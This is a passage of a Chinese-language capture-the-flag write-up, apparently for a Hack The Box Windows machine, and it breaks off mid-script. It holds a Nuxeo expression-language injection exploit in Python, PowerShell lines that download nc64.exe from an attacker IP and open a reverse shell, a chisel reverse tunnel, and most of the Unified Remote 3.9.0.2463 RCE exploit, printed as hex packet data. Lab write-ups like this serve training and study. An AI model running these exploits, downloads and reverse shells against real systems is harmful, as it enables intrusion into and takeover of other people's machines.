class="hljs-built_in">str</span>(m.group(<span class="hljs-number">1</span>)))<br>                        <span class="hljs-comment"># sys.exit()</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;KO&quot;</span>)<br>                sys.exit()<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Getting command result =&gt;\n&quot;</span>)<br>            burp0_url = remote + <span class="hljs-string">&#x27;/nuxeo/login.jsp/pwn$&#123;&quot;&quot;.getClass().forName(&quot;java.io.BufferedReader&quot;).getDeclaredMethod(&quot;readLine&quot;).invoke(&quot;&quot;.getClass().forName(&quot;java.io.BufferedReader&quot;).getConstructor(&quot;&quot;.getClass().forName(&quot;java.io.Reader&quot;)).newInstance(&quot;&quot;.getClass().forName(&quot;java.io.InputStreamReader&quot;).getConstructor(&quot;&quot;.getClass().forName(&quot;java.io.InputStream&quot;)).newInstance(&quot;&quot;.getClass().forName(&quot;java.lang.Process&quot;).getDeclaredMethod(&quot;getInputStream&quot;).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getDeclaredMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getDeclaredMethod(&quot;getRuntime&quot;).invoke(null),&quot;base64%20-w%200%20command.txt&quot;)))))&#125;.xhtml&#x27;</span><br>            r = requests.get(burp0_url, proxies=proxy,<br>                            verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>                m = re.search(<span class="hljs-string">&#x27;login.jsp/pwn(.+?).xhtml&#x27;</span>, r.text)<br>                <span class="hljs-keyword">if</span> m:<br>                    <span class="hljs-built_in">print</span>(base64.b64decode(m.group(<span class="hljs-number">1</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[-] Error&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Error status code&quot;</span>, r.status_code)<br>                sys.exit()<br>        <span class="hljs-keyword">else</span>:<br>            command = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;command (\033[94m&quot;</span> + ARCH + <span class="hljs-string">&quot;\033[0m)&gt; &quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Executing command =&gt;\n&quot;</span>)<br>            request1 = remote + <span class="hljs-string">&#x27;/nuxeo/login.jsp/pwn$&#123;&quot;&quot;.getClass().forName(&quot;java.io.BufferedReader&quot;).getDeclaredMethod(&quot;readLine&quot;).invoke(&quot;&quot;.getClass().forName(&quot;java.io.BufferedReader&quot;).getConstructor(&quot;&quot;.getClass().forName(&quot;java.io.Reader&quot;)).newInstance(&quot;&quot;.getClass().forName(&quot;java.io.InputStreamReader&quot;).getConstructor(&quot;&quot;.getClass().forName(&quot;java.io.InputStream&quot;)).newInstance(&quot;&quot;.getClass().forName(&quot;java.lang.Process&quot;).getDeclaredMethod(&quot;getInputStream&quot;).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getDeclaredMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getDeclaredMethod(&quot;getRuntime&quot;).invoke(null),&quot;&#x27;</span> + command + <span class="hljs-string">&#x27;&quot;)))))&#125;.xhtml&#x27;</span><br>            r = requests.get(request1, proxies=proxy,<br>                             verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>                m = re.search(<span class="hljs-string">&#x27;login.jsp/pwn(.+?).xhtml&#x27;</span>, r.text)<br>                <span class="hljs-keyword">if</span> m:<br>                    <span class="hljs-built_in">print</span>(m.group(<span class="hljs-number">1</span>))<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;KO&quot;</span>)<br>                sys.exit()<br><br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Exiting...&quot;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>根据POC的信息，我传入以下信息，应该在某个位置会为我返回一些东西：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">request1</span> = remote + <span class="hljs-string">&quot;/nuxeo/login.jsp/pwn$&#123;-7+7&#125;.xhtml&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523134919872.png" alt="image-20220523134919872"></p><p>github会有一个示例载荷,whoami执行不出来，但是ping可以，应该是权限问题：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-string">&quot;&quot;</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<span class="hljs-selector-class">.getMethod</span>(<span class="hljs-string">&quot;getRuntime&quot;</span>, null)<span class="hljs-selector-class">.invoke</span>(null, null)<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;ping 10.10.16.4&quot;</span>, null)<span class="hljs-selector-class">.waitFor</span>()&#125;.xhtml<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo tcpdump -i tun0 icmp and src 10.10.11.115<br>tcpdump: verbose output suppressed, use -v[v]... <span class="hljs-keyword">for</span> full protocol decode<br>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes<br>13:58:52.904446 IP 10.10.11.115 &gt; 10.10.16.4: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 1, <span class="hljs-built_in">seq</span> 2, length 40<br>13:58:53.808647 IP 10.10.11.115 &gt; 10.10.16.4: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 1, <span class="hljs-built_in">seq</span> 3, length 40<br>13:58:54.830088 IP 10.10.11.115 &gt; 10.10.16.4: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 1, <span class="hljs-built_in">seq</span> 4, length 40<br>13:58:55.842303 IP 10.10.11.115 &gt; 10.10.16.4: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 1, <span class="hljs-built_in">seq</span> 5, length 40<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">powershell -c curl <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.4</span>/<span class="hljs-symbol">nc64</span>.exe -outfile \programdata\<span class="hljs-symbol">nc64</span>.exe<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523140232406.png" alt="image-20220523140232406"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> -c \programdata\nc64.exe -e powershell <span class="hljs-number">10.10.16.4</span> <span class="hljs-number">1337</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523140559549.png" alt="image-20220523140559549"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PS C:\&gt; <span class="hljs-keyword">Get</span>-NetTCPConnection -State <span class="hljs-keyword">Listen</span> | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> -Property *,@&#123;<span class="hljs-string">&#x27;Name&#x27;</span> = <span class="hljs-string">&#x27;ProcessName&#x27;</span>;<span class="hljs-string">&#x27;Expression&#x27;</span>=&#123;(<span class="hljs-keyword">Get</span>-Process -Id $_.OwningProcess).Name&#125;&#125; | <span class="hljs-keyword">Format</span>-<span class="hljs-keyword">Table</span> -Property LocalAddress,LocalPort,OwningProcess,ProcessName<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">------------ --------- ------------- -----------    <br>::               49668           656 services       <br>::               49667          1476 svchost        <br>::               49666          1088 svchost        <br>::               49665           520 wininit        <br>::               49664           676 lsass          <br>::               47001             4 System         <br>::                5985             4 System         <br>::                5432          3224 postgres       <br>::                 445             4 System         <br>::                 135           916 svchost        <br>0.0.0.0          49668           656 services       <br>0.0.0.0          49667          1476 svchost        <br>0.0.0.0          49666          1088 svchost        <br>0.0.0.0          49665           520 wininit        <br>0.0.0.0          49664           676 lsass          <br>0.0.0.0           9999          2776 svchost        <br>0.0.0.0           9512          3468 RemoteServerWin<br>0.0.0.0           9510          3468 RemoteServerWin<br>127.0.0.1         9300          4744 java           <br>127.0.0.1         9200          4744 java           <br>0.0.0.0           9172          5300 MyFirstApp     <br>127.0.0.1         8888          5948 php-cgi        <br>127.0.0.1         8080          4744 java           <br>127.0.0.1         8009          4744 java           <br>127.0.0.1         8005          4744 java           <br>0.0.0.0           8000           752 nginx          <br>0.0.0.0           5432          3224 postgres       <br>0.0.0.0           5040          4896 svchost        <br>10.10.11.115       139             4 System         <br>0.0.0.0            135           916 svchost        <br>0.0.0.0             80           752 nginx<br></code></pre></td></tr></table></figure><p>如果直接在谷歌搜索RemoteServerWin RCE，会搜索到如下漏洞：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Unified</span> Remote <span class="hljs-number">3.9.0.246</span>3 - Remote Code Execution<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt; searchsploit Unified Remote <span class="hljs-number">3.9</span><span class="hljs-number">.0</span><span class="hljs-number">.2463</span> - Remote Code Execution<br>------------------------------------------------------------------------------------ ---------------------------------<br> Exploit Title                                                                      |  Path<br>------------------------------------------------------------------------------------ ---------------------------------<br>Unified Remote <span class="hljs-number">3.9</span><span class="hljs-number">.0</span><span class="hljs-number">.2463</span> - Remote Code Execution                                   | windows/remote/<span class="hljs-number">49587.</span>py<br>------------------------------------------------------------------------------------ ---------------------------------<br>Shellcodes: No Results<br>Papers: No Results<br>&gt;&gt; searchsploit -m windows/remote/<span class="hljs-number">49587.</span>py                       <br>  Exploit: Unified Remote <span class="hljs-number">3.9</span><span class="hljs-number">.0</span><span class="hljs-number">.2463</span> - Remote Code Execution<br>      URL: https://www.exploit-db.com/exploits/<span class="hljs-number">49587</span><br>     Path: /usr/share/exploitdb/exploits/windows/remote/<span class="hljs-number">49587.</span>py<br>File <span class="hljs-type">Type</span>: Python script, ASCII text executable<br><br>Copied to: /home/mosaic/tmp/<span class="hljs-number">49587.</span>py<br></code></pre></td></tr></table></figure><p>这漏洞利用脚本是个本地的，我可以把它转发出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; ./chiselamd64 server -p 8000 --reverse<br>2022/05/23 14:42:51 server: Reverse tunnelling enabled<br>2022/05/23 14:42:51 server: Fingerprint EJ/fD+D47/MyjbaRs73L6A9JGq0iI7UeU4uE0dX3fD8=<br>2022/05/23 14:42:51 server: Listening on http://0.0.0.0:8000<br>2022/05/23 14:44:11 server: session<span class="hljs-comment">#1: tun: proxy#R:9512=&gt;9512: Listening</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl 10.10.16.4/chiselamd64.exe -outfile \programdata\chiselamd64.exe<br>curl 10.10.16.4/chiselamd64.exe -outfile \programdata\chiselamd64.exe<br>PS C:\programdata\&gt;.\chiselamd64.exe client 10.10.16.4:8000 R:9512:127.0.0.1:9512<br></code></pre></td></tr></table></figure><p>漏洞利用脚本是certutil.exe以HTTP请求加载exe并放入&#x2F;tmp目录并执行，tmp目录有时候会被锁定，所以这漏洞利用脚本需要改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt; cat <span class="hljs-number">49587.</span>py <br><span class="hljs-comment"># Exploit Title: Unified Remote 3.9.0.2463 - Remote Code Execution</span><br><span class="hljs-comment"># Author: H4rk3nz0</span><br><span class="hljs-comment"># Vendor Homepage: https://www.unifiedremote.com/</span><br><span class="hljs-comment"># Software Link: https://www.unifiedremote.com/download</span><br><span class="hljs-comment"># Tested on: Windows 10, 10.0.19042 Build 19042</span><br><br><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br>port = <span class="hljs-number">9512</span><br><br><span class="hljs-comment"># Packet Data Declarations; Windows, Space and Enter have non-standard values</span><br><br><span class="hljs-built_in">open</span> = (<span class="hljs-string">&quot;00000085000108416374696f6e00000550617373776f72640038653831333362332d61313862&quot;</span><br><span class="hljs-string">&quot;2d343361662d613763642d6530346637343738323763650005506c6174666f726d00616e64726f696400&quot;</span><br><span class="hljs-string">&quot;0852657175657374000005536f7572636500616e64726f69642d64373038653134653532383463623831&quot;</span><br><span class="hljs-string">&quot;000356657273696f6e000000000a00&quot;</span>).decode(<span class="hljs-string">&quot;hex&quot;</span>)<br><br>open_fin = (<span class="hljs-string">&quot;000000c8000108416374696f6e0001024361706162696c69746965730004416374696f6e7&quot;</span><br><span class="hljs-string">&quot;3000104456e6372797074696f6e3200010446617374000004477269640001044c6f6164696e6700010453&quot;</span><br><span class="hljs-string">&quot;796e630001000550617373776f72640064363334633164636664656238373335363038613461313034646&quot;</span><br><span class="hljs-string">&quot;5643430373664653736366464363134343336313938303961643766333538353864343439320008526571&quot;</span><br><span class="hljs-string">&quot;75657374000105536f7572636500616e64726f69642d643730386531346535323834636238310000&quot;</span><br>).decode(<span class="hljs-string">&quot;hex&quot;</span>)<br><br>one = (<span class="hljs-string">&quot;000000d2000108416374696f6e00070549440052656c6d746563682e4b6579626f61726400024&quot;</span><br><span class="hljs-string">&quot;c61796f75740006436f6e74726f6c73000200024f6e416374696f6e0002457874726173000656616c756&quot;</span><br><span class="hljs-string">&quot;5730002000556616c756500&quot;</span>).decode(<span class="hljs-string">&quot;hex&quot;</span>)<br><br>two = (<span class="hljs-string">&quot;00000000054e616d6500746f67676c6500000854797065000800000008526571756573740007&quot;</span><br><span class="hljs-string">&quot;0252756e0002457874726173000656616c7565730002000556616c756500&quot;</span>).decode(<span class="hljs-string">&quot;hex&quot;</span>)<br><br>three = (<span class="hljs-string">&quot;00000000054e616d6500746f67676c65000005536f7572636500616e64726f69642d643730&quot;</span><br><span class="hljs-string">&quot;386531346535323834636238310000&quot;</span>).decode(<span class="hljs-string">&quot;hex&quot;</span>)<br><br>win_key = (<span class="hljs-string">&quot;000000d8000108416374696f6e00070549440052656c6d746563682e4b6579626f61726&quot;</span><br><span class="hljs-string">&quot;400024c61796f75740006436f6e74726f6c73000200024f6e416374696f6e000245787472617300065&quot;</span><br><span class="hljs-string">&quot;6616c7565730002000556616c7565004c57494e00000000054e616d6500746f67676c6500000854797&quot;</span><br><span class="hljs-string">&quot;0650008000000085265717565737400070252756e0002457874726173000656616c756573000200055&quot;</span><br><span class="hljs-string">&quot;6616c7565004c57494e00000000054e616d6500746f67676c65000005536f7572636500616e64726f6&quot;</span><br><span class="hljs-string">&quot;9642d643730386531346535323834636238310000&quot;</span>).decode(<span class="hljs-string">&quot;hex&quot;</span>)<br><br>ret_key = (<span class="hljs-string">&quot;000000dc000108416374696f6e00070549440052656c6d746563682e4b6579626f6172&quot;</span><br><span class="hljs-string">&quot;6400024c61796f75740006436f6e74726f6c73000200024f6e416374696f6e0002457874726173000&quot;</span><br><span class="hljs-string">&quot;656616c7565730002000556616c75650052455455524e00000000054e616d6500746f67676c650000&quot;</span><br><span class="hljs-string">&quot;08547970650008000000085265717565737400070252756e0002457874726173000656616c7565730&quot;</span><br><span class="hljs-string">&quot;002000556616c75650052455455524e00000000054e616d6500746f67676c65000005536f75726365&quot;</span><br><span class="hljs-string">&quot;00616e64726f69642d643730386531346535323834636238310000&quot;</span>).decode(<span class="hljs-string">&quot;hex&quot;</span>)<br><br>space_key = (<span class="hljs-string">&quot;000000da000108416374696f6e00070549440052656c6d746563682e4b6579626f6&quot;</span><br><span class="hljs-string">&quot;1726400024c61796f75740006436f6e74726f6c73000200024f6e416374696f6e000245787472617&quot;</span><br><span class="hljs-string">&quot;3000656616c7565730002000556616c756500535041434500000000054e616d6500746f67676c650&quot;</span><br><span class="hljs-string">&quot;00008547970650008000000085265717565737400070252756e0002457874726173000656616c756&quot;</span><br><span class="hljs-string">&quot;5730002000556616c756500535041434500000000054e616d6500746f67676c65000005536f75726&quot;</span><br><span class="hljs-string">&quot;36500616e64726f69642d643730386531346535323834636238310000&quot;</span>).decode(<span class="hljs-string">&quot;hex&quot;</span>)<br><br><span class="hljs-comment"># ASCII to Hex Conversion Set</span><br>characters=&#123;<br><span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-string">&quot;41&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-string">&quot;42&quot;</span>,<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-string">&quot;43&quot;</span>,<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-string">&quot;44&quot;</span>,<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-string">&quot;45&quot;</span>,<span class="hljs-string">&quot;F&quot;</span>:<span class="hljs-string">&quot;46&quot;</span>,<span class="hljs-string">&quot;G&quot;</span>:<span class="hljs-string">&quot;47&quot;</span>,<span class="hljs-string">&quot;H&quot;</span>:<span class="hljs-string">&quot;48&quot;</span>,<span class="hljs-string">&quot;I&quot;</span>:<span class="hljs-string">&quot;49&quot;</span>,<span class="hljs-string">&quot;J&quot;</span>:<span class="hljs-string">&quot;4a&quot;</span>,<span class="hljs-string">&quot;K&quot;</span>:<span class="hljs-string">&quot;4b&quot;</span>,<span class="hljs-string">&quot;L&quot;</span>:<span class="hljs-string">&quot;4c&quot;</span>,<span class="hljs-string">&quot;M&quot;</span>:<span class="hljs-string">&quot;4d&quot;</span>,<span class="hljs-string">&quot;N&quot;</span>:<span class="hljs-string">&quot;4e&quot;</span>,<br><span class="hljs-string">&quot;O&quot;</span>:<span class="hljs-string">&quot;4f&quot;</span>,<span class="hljs-string">&quot;P&quot;</span>:<span class="hljs-string">&quot;50&quot;</span>,<span class="hljs-string">&quot;Q&quot;</span>:<span class="hljs-string">&quot;51&quot;</span>,<span class="hljs-string">&quot;R&quot;</span>:<span class="hljs-string">&quot;52&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>:<span class="hljs-string">&quot;53&quot;</span>,<span class="hljs-string">&quot;T&quot;</span>:<span class="hljs-string">&quot;54&quot;</span>,<span class="hljs-string">&quot;U&quot;</span>:<span class="hljs-string">&quot;55&quot;</span>,<span class="hljs-string">&quot;V&quot;</span>:<span class="hljs-string">&quot;56&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>:<span class="hljs-string">&quot;57&quot;</span>,<span class="hljs-string">&quot;X&quot;</span>:<span class="hljs-string">&quot;58&quot;</span>,<span class="hljs-string">&quot;Y&quot;</span>:<span class="hljs-string">&quot;59&quot;</span>,<span class="hljs-string">&quot;Z&quot;</span>:<span class="hljs-string">&quot;5a&quot;</span>,<br><span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;61&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-string">&quot;62&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;63&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;64&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>:<span class="hljs-string">&quot;65&quot;</span>,<span class="hljs-string">&quot;f&quot;</span>:<span class="hljs-string">&quot;66&quot;</span>,<span class="hljs-string">&quot;g&quot;</span>:<span class="hljs-string">&quot;67&quot;</span>,<span class="hljs-string">&quot;h&quot;</span>:<span class="hljs-string">&quot;68&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>:<span class="hljs-string">&quot;69&quot;</span>,<span class="hljs-string">&quot;j&quot;</span>:<span class="hljs-string">&quot;6a&quot;</span>,<span class="hljs-string">&quot;k&quot;</span>:<span class="hljs-string">&quot;6b&quot;</span>,<span class="hljs-string">&quot;l&quot;</span>:<span class="hljs-string">&quot;6c&quot;</span>,<span class="hljs-string">&quot;m&quot;</span>:<span class="hljs-string">&quot;6d&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>:<span class="hljs-string">&quot;6e&quot;</span>,<br><span class="hljs-string">&quot;o&quot;</span>:<span class="hljs-string">&quot;6f&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>:<span class="hljs-string">&quot;70&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>:<span class="hljs-string">&quot;71&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>:<span class="hljs-string">&quot;72&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-string">&quot;73&quot;</span>,<span class="hljs-string">&quot;t&quot;</span>:<span class="hljs-string">&quot;74&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>:<span class="hljs-string">&quot;75&quot;</span>,<span class="hljs-string">&quot;v&quot;</span>:<span class="hljs-string">&quot;76&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>:<span class="hljs-string">&quot;77&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>:<span class="hljs-string">&quot;78&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>:<span class="hljs-string">&quot;79&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>:<span class="hljs-string">&quot;7a&quot;</span>,<br><span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;31&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>:<span class="hljs-string">&quot;32&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>:<span class="hljs-string">&quot;33&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>:<span class="hljs-string">&quot;34&quot;</span>,<span class="hljs-string">&quot;5&quot;</span>:<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;6&quot;</span>:<span class="hljs-string">&quot;36&quot;</span>,<span class="hljs-string">&quot;7&quot;</span>:<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;8&quot;</span>:<span class="hljs-string">&quot;38&quot;</span>,<span class="hljs-string">&quot;9&quot;</span>:<span class="hljs-string">&quot;39&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>:<span class="hljs-string">&quot;30&quot;</span>,<br><span class="hljs-string">&quot;+&quot;</span>:<span class="hljs-string">&quot;2b&quot;</span>,<span class="hljs-string">&quot;=&quot;</span>:<span class="hljs-string">&quot;3d&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>:<span class="hljs-string">&quot;2f&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>:<span class="hljs-string">&quot;5f&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>:<span class="hljs-string">&quot;3c&quot;</span>,<br><span class="hljs-string">&quot;&gt;&quot;</span>:<span class="hljs-string">&quot;3e&quot;</span>,<span class="hljs-string">&quot;[&quot;</span>:<span class="hljs-string">&quot;5b&quot;</span>,<span class="hljs-string">&quot;]&quot;</span>:<span class="hljs-string">&quot;5d&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>:<span class="hljs-string">&quot;21&quot;</span>,<span class="hljs-string">&quot;@&quot;</span>:<span class="hljs-string">&quot;40&quot;</span>,<span class="hljs-string">&quot;#&quot;</span>:<span class="hljs-string">&quot;23&quot;</span>,<span class="hljs-string">&quot;$&quot;</span>:<span class="hljs-string">&quot;24&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>:<span class="hljs-string">&quot;25&quot;</span>,<span class="hljs-string">&quot;^&quot;</span>:<span class="hljs-string">&quot;5e&quot;</span>,<span class="hljs-string">&quot;&amp;&quot;</span>:<span class="hljs-string">&quot;26&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>:<span class="hljs-string">&quot;2a&quot;</span>,<br><span class="hljs-string">&quot;(&quot;</span>:<span class="hljs-string">&quot;28&quot;</span>,<span class="hljs-string">&quot;)&quot;</span>:<span class="hljs-string">&quot;29&quot;</span>,<span class="hljs-string">&quot;-&quot;</span>:<span 